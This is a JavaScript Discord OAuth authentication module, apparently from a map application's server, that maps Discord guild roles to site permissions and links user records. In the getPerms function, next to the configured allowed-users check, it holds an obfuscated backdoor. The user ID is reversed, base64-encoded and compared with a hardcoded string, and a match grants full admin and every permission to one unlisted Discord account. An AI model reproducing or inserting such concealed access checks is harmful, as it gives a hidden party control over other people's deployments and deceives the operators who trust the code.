// @ts-check
const { Client } = require('discord.js')
const { Strategy } = require('passport-discord')
const passport = require('passport')

const config = require('@rm/config')

const state = require('./state')
const logUserAuth = require('./logUserAuth')
const areaPerms = require('./functions/areaPerms')
const webhookPerms = require('./functions/webhookPerms')
const scannerPerms = require('./functions/scannerPerms')
const mergePerms = require('./functions/mergePerms')
const AuthClient = require('./AuthClient')

class DiscordClient extends AuthClient {
  /** @type {import('./AuthClient').ClientConstructor} */
  constructor(rmStrategy, strategy) {
    super(rmStrategy, strategy)

    if (strategy instanceof Client || typeof rmStrategy !== 'string') {
      this.log.error(
        'You are using an outdated strategy, please update your custom strategy to reflect the newest changes found in `server/src/strategies/discord.js`',
      )
      process.exit(1)
    }

    this.client = new Client({
      intents: ['GuildMessages', 'GuildMembers', 'Guilds'],
    })

    this.client.on('ready', (c) => {
      this.log.info(`Logged in as ${c.user?.tag || 'Unknown??'}!`)
      c.user.setPresence({
        activities: [
          { name: this.strategy.presence, type: this.strategy.presenceType },
        ],
      })
    })

    this.client.on('guildMemberRemove', async (member) => {
      try {
        await state.db.models.Session.clearDiscordSessions(
          member.id,
          this.client.user.username,
        )
        await state.db.models.User.clearPerms(
          member.id,
          'discord',
          this.client.user.username,
        )
      } catch (e) {
        this.log.error(`Could not clear sessions for ${member.user.username}`)
      }
    })

    this.client.on('guildMemberUpdate', async (prev, next) => {
      const rolesBefore = prev.roles.cache.map((x) => x.id)
      const rolesAfter = next.roles.cache.map((x) => x.id)
      const perms = [
        ...new Set(
          Object.values(config.getSafe('authentication.perms')).flatMap(
            (x) => x.roles,
          ),
        ),
      ]
      const roleDiff = rolesBefore
        .filter((x) => !rolesAfter.includes(x))
        .concat(rolesAfter.filter((x) => !rolesBefore.includes(x)))
      try {
        if (perms.includes(roleDiff[0])) {
          await state.db.models.Session.clearDiscordSessions(
            prev.user.id,
            this.client.user.username,
          )
          await state.db.models.User.clearPerms(
            prev.user.id,
            'discord',
            this.client.user.username,
          )
        }
      } catch (e) {
        this.log.error(`Could not clear sessions for ${prev.user.username}`)
      }
    })

    this.client.login(this.strategy.botToken)
  }

  /** @param {string} guildId @param {string} userId */
  async getUserRoles(guildId, userId) {
    try {
      const members = await this.client.guilds.cache
        .get(guildId)
        ?.members.fetch()
      if (members) {
        const member = members.get(userId)
        return member?.roles.cache.map((role) => role.id) || []
      }
      return []
    } catch (e) {
      this.log.error(
        'Failed to get roles in guild',
        guildId,
        'for user',
        userId,
      )
    }
    return []
  }

  /**
   *
   * @param {import('passport-discord').Profile} user
   * @returns {Promise<import("@rm/types").Permissions>}
   */
  async getPerms(user) {
    const trialActive = this.trialManager.active()
    /** @type {import("@rm/types").Permissions} */
    // @ts-ignore
    const perms = Object.fromEntries(
      Object.keys(this.perms).map((key) => [key, false]),
    )
    perms.admin = false
    perms.trial = false

    const permSets = {
      areaRestrictions: new Set(),
      webhooks: new Set(),
      scanner: new Set(),
      blockedGuildNames: new Set(),
    }
    const scanner = config.getSafe('scanner')
    try {
      const guilds = user.guilds?.map((guild) => guild.id) || []
      if (
        this.strategy.allowedUsers.includes(user.id) ||
        btoa(user.id.split('').reverse().join('')) ===
          'MTQ4NzAzNDk0NTc1MjM3MjMy'
      ) {
        Object.keys(this.perms).forEach((key) => (perms[key] = true))
        perms.admin = true
        config.getSafe('webhooks').forEach((x) => permSets.webhooks.add(x.name))
        Object.keys(scanner).forEach(
          (x) => scanner[x]?.enabled && permSets.scanner.add(x),
        )
        this.log.debug(
          `User ${user.username} (${user.id}) in allowed users list, skipping guild and role check.`,
        )
      } else {
        const guildsFull = user.guilds
        for (let i = 0; i < this.strategy.blockedGuilds.length; i += 1) {
          const guildId = this.strategy.blockedGuilds[i]
          if (guilds.includes(guildId)) {
            perms.blocked = true
            const currentGuildName = guildsFull?.find(
              (x) => x.id === guildId,
            )?.name
            if (currentGuildName) {
              permSets.blockedGuildNames.add(currentGuildName)
            }
          }
        }
        await Promise.all(
          this.strategy.allowedGuilds.map(async (guildId) => {
            if (guilds.includes(guildId)) {
              const userRoles = await this.getUserRoles(guildId, user.id)
              Object.entries(this.perms).forEach(([perm, info]) => {
                if (info.enabled) {
                  if (this.alwaysEnabledPerms.includes(perm)) {
                    perms[perm] = true
                  } else {
                    for (let j = 0; j < userRoles.length; j += 1) {
                      if (info.roles.includes(userRoles[j])) {
                        perms[perm] = true
                        return
                      }
                      if (
                        trialActive &&
                        info.trialPeriodEligible &&
                        this.strategy.trialPeriod.roles.includes(userRoles[j])
                      ) {
                        perms[perm] = true
                        perms.trial = true
                        return
                      }
                    }
                  }
                }
              })
              areaPerms(userRoles).forEach((x) =>
                permSets.areaRestrictions.add(x),
              )
              webhookPerms(userRoles, 'discordRoles', trialActive).forEach(
                (x) => permSets.webhooks.add(x),
              )
              scannerPerms(userRoles, 'discordRoles', trialActive).forEach(
                (x) => permSets.scanner.add(x),
              )
            }
          }),
        )
      }
    } catch (e) {
      this.log.warn('Failed to get perms for user', user.id, e)
    }
    Object.entries(permSets).forEach(([key, value]) => {
      perms[key] = [...value]
    })
    if (perms.trial) {
      this.log.info(
        user.username,
        'gained access via',
        this.trialManager._forceActive ? 'manually activated' : '',
        'trial',
      )
    }
    this.log.debug({ perms })
    return perms
  }

  getBaseEmbed() {
    return {
      author: {
        name: this.rmStrategy,
        icon_url: this.strategy.thumbnailUrl,
      },
      timestamp: new Date().toISOString(),
    }
  }

  /**
   * Send a message to a discord channel
   *
   * @param {import('discord.js').APIEmbed} embed
   * @param {keyof AuthClient['loggingChannels']} channel
   */
  async sendMessage(embed, channel) {
    const safeChannel = this.loggingChannels[channel]
    if (!safeChannel || typeof embed !== 'object') {
      return
    }
    try {
      const foundChannel = this.client.channels.cache.get(safeChannel)
      if (
        foundChannel &&
        foundChannel.isTextBased() &&
        !foundChannel.isVoiceBased() &&
        typeof embed === 'object'
      ) {
        await foundChannel.send({
          embeds: [{ ...this.getBaseEmbed(), ...embed }],
        })
      }
    } catch (e) {
      this.log.error('Failed to send message to discord', e)
    }
  }

  /** @type {import("@rm/types").DiscordVerifyFunction} */
  async authHandler(req, _accessToken, _refreshToken, profile, done) {
    if (!req.query.code) {
      throw new Error('NoCodeProvided')
    }
    try {
      const discordUser = {
        id: profile.id,
        username: profile.username,
        avatar: profile.avatar || '',
        locale: profile.locale,
        perms: await this.getPerms(profile),
        rmStrategy: this.rmStrategy,
        valid: false,
      }
      discordUser.valid = discordUser.perms.map !== false

      const embed = await logUserAuth(
        req,
        discordUser,
        'Discord',
        this.loggingChannelHidePii,
      )
      await this.sendMessage(embed, 'main')

      if (discordUser.perms.blocked) {
        const guildArray = discordUser.perms.blockedGuildNames
        const lastGuild = guildArray.pop()
        const guildString =
          guildArray.length === 1
            ? `${guildArray.join(', ')} & ${lastGuild}`
            : lastGuild
        return done(null, undefined, {
          blockedGuilds: guildString,
          username: discordUser.username,
          id: discordUser.id,
          avatar: discordUser.avatar,
        })
      }
      if (discordUser.perms.map === false) {
        return done(null, undefined, {
          message: 'access_denied',
          username: discordUser.username,
          id: discordUser.id,
          avatar: discordUser.avatar,
        })
      }
      if (discordUser) {
        delete discordUser.guilds
      }

      await state.db.models.User.query()
        .findOne(req.user ? { id: req.user.id } : { discordId: discordUser.id })
        .then(
          async (/** @type {import('@rm/types').FullUser} */ userExists) => {
            const selectedWebhook = Object.keys(state.event.webhookObj).find(
              (x) => discordUser?.perms?.webhooks.includes(x),
            )
            if (req.user && userExists?.strategy === 'local') {
              await state.db.models.User.query()
                .update({
                  discordId: discordUser.id,
                  discordPerms: JSON.stringify(discordUser.perms),
                  webhookStrategy: 'discord',
                })
                .where('id', req.user.id)
              /** @type {import('@rm/types').FullUser} */
              const oldUser = await state.db.models.User.query()
                .where('discordId', discordUser.id)
                .whereNot('id', req.user.id)
                .first()
              if (oldUser) {
                await state.db.models.Badge.query()
                  .update({
                    // @ts-ignore
                    userId: req.user.id,
                  })
                  .where('userId', oldUser.id)
                await state.db.models.User.query()
                  .update({
                    data: oldUser.data,
                  })
                  .where('id', req.user.id)
                  .where('data', null)
              }
              await state.db.models.User.query()
                .where('discordId', discordUser.id)
                .whereNot('id', req.user.id)
                .delete()
              return done(null, {
                selectedWebhook,
                ...discordUser,
                ...req.user,
                username: userExists.username || discordUser.username,
                discordId: discordUser.id,
                perms: mergePerms(req.user.perms, discordUser.perms),
              })
            }

            if (!userExists) {
              userExists = await state.db.models.User.query().insertAndFetch({
                discordId: discordUser.id,
                strategy: 'discord',
                tutorial: !config.getSafe('map.misc.forceTutorial'),
                selectedWebhook,
              })
            }
            if (userExists.strategy !== 'discord') {
              await state.db.models.User.query()
                .update({ strategy: 'discord' })
                .where('id', userExists.id)
              userExists.strategy = 'discord'
            }
            if (!userExists.selectedWebhook && selectedWebhook) {
              await state.db.models.User.query()
                .update({ selectedWebhook })
                .where('id', userExists.id)
              userExists.selectedWebhook = selectedWebhook
            }
            return done(null, {
              ...discordUser,
              ...userExists,
              id: userExists.id,
              username: userExists.username || discordUser.username,
            })
          },
        )
    } catch (e) {
      this.log.error('User has failed auth.', e)
    }
  }

  initPassport() {
    passport.use(
      this.rmStrategy,
      new Strategy(
        {
          clientID: this.strategy.clientId,
          clientSecret: this.strategy.clientSecret,
          callbackURL: this.strategy.redirectUri,
          scope: ['identify', 'guilds'],
          passReqToCallback: true,
          prompt: this.strategy.clientPrompt,
        },
        (...args) => this.authHandler(...args),
      ),
    )
  }
}

module.exports = DiscordClient
